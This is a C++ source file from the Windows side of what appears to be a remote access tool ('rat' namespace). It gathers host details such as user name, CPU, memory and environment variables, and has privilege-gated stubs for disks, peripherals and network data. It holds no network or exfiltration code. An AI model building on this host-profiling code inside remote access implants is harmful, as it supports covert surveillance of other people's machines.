#include "rat/system.hpp"

#include <Lmcons.h>
#include <WinSock2.h>
#include <fmt/core.h>
#include <intrin.h> // Needed for __cpuid
#include <string>
#include <windows.h>

namespace rat::system {

std::string getUserName(void) {
    char username[UNLEN + 1];
    DWORD len = UNLEN + 1;
    if(GetUserNameA(username, &len))
        return std::string(username);
    return {};
}

std::string getOsInfo(void) {
    return "Windows"; // Placeholder, could use RtlGetVersion for detailed info
}

std::string getConnectedPeripherals(void) {
    if(!isElevatedPrivileges())
        return "ERROR: Requires elevated privileges";
    return "Connected peripherals listing not implemented yet for Windows.";
}

std::string getDisks(void) {
    if(!isElevatedPrivileges())
        return "ERROR: Requires elevated privileges";
    return "Disk listing not implemented yet for Windows.";
}

std::string getCpuInfo(void) {
    char cpuName[0x40] = {};
    int cpuInfo[4] = {-1};
    __cpuid(cpuInfo, 0x80000000);
    unsigned int nExIds = cpuInfo[0];
    if(nExIds >= 0x80000004) {
        __cpuid(reinterpret_cast<int *>(cpuName), 0x80000002);
        __cpuid(reinterpret_cast<int *>(cpuName) + 4, 0x80000003);
        __cpuid(reinterpret_cast<int *>(cpuName) + 8, 0x80000004);
        return std::string(cpuName);
    }
    return {};
}

std::string getMemoryInfo(void) {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    if(GlobalMemoryStatusEx(&statex)) {
        return fmt::format("Total: {} MB, Available: {} MB",
                           statex.ullTotalPhys / (1024 * 1024),
                           statex.ullAvailPhys / (1024 * 1024));
    }
    return {};
}

std::string getNetworkInfo(void) {
    if(!isElevatedPrivileges())
        return "ERROR: Requires elevated privileges";
    return "Network info not implemented yet for Windows.";
}

std::string getEnvVar(const std::string &arg_Name) {
    const char *val = std::getenv(arg_Name.c_str());
    return val ? std::string(val) : "";
}

bool setEnvVar(const std::string &arg_Name, const std::string &arg_Value) {
    return SetEnvironmentVariableA(arg_Name.c_str(), arg_Value.c_str());
}

} // namespace rat::system
